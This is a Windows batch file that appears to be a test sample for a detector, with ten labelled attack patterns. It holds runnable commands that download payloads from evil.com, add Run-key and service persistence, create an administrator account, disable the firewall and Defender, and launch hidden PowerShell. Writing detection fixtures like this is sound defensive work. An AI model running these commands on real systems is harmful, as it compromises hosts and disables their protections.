@echo off
REM Test sample: Batch script attack patterns for BAT-001 through BAT-010

REM BAT-001: Certutil download
certutil -urlcache -split -f https://evil.com/payload.exe C:\temp\payload.exe

REM BAT-002: Bitsadmin download
bitsadmin /transfer backdoor https://evil.com/malware.exe C:\temp\malware.exe

REM BAT-003: Registry modification
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /d C:\evil.exe /f

REM BAT-004: User account creation
net user hacker P@ssw0rd! /add
net localgroup administrators hacker /add

REM BAT-005: Firewall disable
netsh advfirewall set allprofiles state off

REM BAT-006: Service creation
sc create backdoor binPath= C:\temp\evil.exe start= auto

REM BAT-007: Kill security processes
taskkill /f /im MsMpEng.exe
net stop WinDefend

REM BAT-008: Hidden PowerShell from batch
powershell -WindowStyle Hidden -enc SQBFAFAA==

REM BAT-009: Wscript execution
wscript C:\temp\dropper.vbs

REM BAT-010: Hidden files
attrib +h C:\temp\payload.exe
